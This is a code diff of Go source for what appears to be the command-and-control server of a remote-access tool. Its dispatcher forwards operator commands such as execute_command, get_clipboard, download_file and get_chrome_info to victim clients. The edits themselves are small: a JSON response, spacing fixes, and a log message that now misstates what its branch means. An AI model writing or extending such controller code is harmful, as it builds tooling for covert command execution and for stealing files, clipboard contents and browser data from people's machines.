@@ -254,7 +254,14 @@ func httpHandler(cm *ClientManager, w http.ResponseWriter, r *http.Request) {
 		message := string(body)
 		fmt.Printf("Received message from %s: %s\n", r.RemoteAddr, message)
 		w.WriteHeader(http.StatusOK)
-		w.Write([]byte("Message received"))
+		res := map[string]string{"message": "Message received"}
+		jsonResponse, err := json.Marshal(res)
+		if err != nil {
+			fmt.Printf("Failed to marshal response to JSON: %v\n", err)
+			http.Error(w, "Internal Server Error", http.StatusInternalServerError)
+			return
+		}
+		w.Write([]byte(string(jsonResponse)))
 		return
 	}
 
@@ -675,7 +682,7 @@ func handleUseCommand(cm *ClientManager, uuid string) {
 		}
 
 		switch message {
-		case "list_files", "get_clipboard", "download_file", "upload_file", "execute_command", "list_processes","get_chrome_info":
+		case "list_files", "get_clipboard", "download_file", "upload_file", "execute_command", "list_processes", "get_chrome_info":
 			if client.Conn != nil {
 				sendMessageToClient(cm, uuid, message)
 			} else if client.ResponseChan != nil {
@@ -707,7 +714,7 @@ func handleUseCommand(cm *ClientManager, uuid string) {
 				case client.ResponseChan <- message:
 					fmt.Printf("Command sent to HTTP client UUID %s: %s\n", uuid, message)
 				default:
-					fmt.Printf("HTTP client UUID %s is not waiting for a response\n", uuid)
+					fmt.Printf("unknown command: %s \n", message)
 				}
 			} else {
 				fmt.Printf("Client UUID %s has no active connection\n", uuid)
@@ -857,5 +864,7 @@ func main() {
 			fmt.Println("Invalid command, please try again.")
 			color.Unset()
 		}
+
 	}
 }
+
